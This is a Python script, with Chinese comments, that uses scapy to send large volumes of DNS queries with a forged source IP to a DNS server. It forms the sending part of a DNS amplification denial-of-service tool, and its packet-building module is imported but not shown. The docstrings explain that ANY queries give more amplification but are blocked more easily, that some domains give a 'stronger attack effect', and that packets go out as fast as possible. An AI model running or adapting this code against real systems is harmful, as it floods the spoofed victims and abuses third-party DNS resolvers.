#!/usr/bin/python3
# -*- coding: utf-8 -*-

from scapy.all import *
import generate_spoof_dns


def start_send_spoof_pkt(src_ip, dst_ip, query_type, packet_number, send_pkt_speed=999999,
                         domain='test.com', ttl_length=128, DNS_RD=1, dns_port=53):
    '''开始发送spoof数据包
    Args:
        src_ip: 伪造的源IP地址
        dst_ip: 目的IP地址（DNS服务器）
        query_type: DNS请求类型，支持A和ANY类型，A类型单个包的放大倍数小，但不容易被屏蔽；ANY类型单个包的放大倍数大，但容易被屏蔽
        packet_number: 发送请求数据包的数量
        send_pkt_speed: 发送数据包的速度，默认为尽可能的快
        domain: DNS请求包中使用的域名，默认为test.com，可以使用其他放大倍数更大的域名，获得更为强烈的攻击效果
        ttl_length: DNS请求包使用的TTL值，默认为128
        DNS_RD: DNS请求递归标志，默认DNS_RD=1为递归请求，DNS_RD=0表示非递归请求
        dns_port: DNS服务器的端口，默认为53端口
    '''
    print('sending packets...')
    send_pkts(src_ip, dst_ip, query_type, packet_number, send_pkt_speed,
              DNS_RD, ttl_length, dns_port, domain)
    print('sending packets finish...')

    return


def send_pkts(src_ip, dst_ip, query_type, packet_number, send_pkt_speed, DNS_RD, ttl_length, dns_port, domain):
    '''发送所有的测试用数据包
    Args:
        src_ip: 伪造的源IP地址
        dst_ip: 目的IP地址（DNS服务器）
        query_type: DNS请求类型，支持A和ANY类型，A类型单个包的放大倍数小，但不容易被屏蔽；ANY类型单个包的放大倍数大，但容易被屏蔽
        packet_number: 发送请求数据包的数量
        send_pkt_speed: 发送数据包的速度，默认为尽可能的快
        DNS_RD: DNS请求递归标志，DNS_RD=1为递归请求，DNS_RD=0表示非递归请求
        ttl_length: DNS请求包使用的TTL值
        dns_port: DNS服务器的端口
        domain: DNS请求包中使用的域名
    '''
    pkts = generate_spoof_dns.generate_pkts(
        src_ip, dst_ip, query_type, packet_number, DNS_RD, ttl_length, dns_port, domain)
    
    sendpfast(pkts, mbps=send_pkt_speed, file_cache=True)

    return
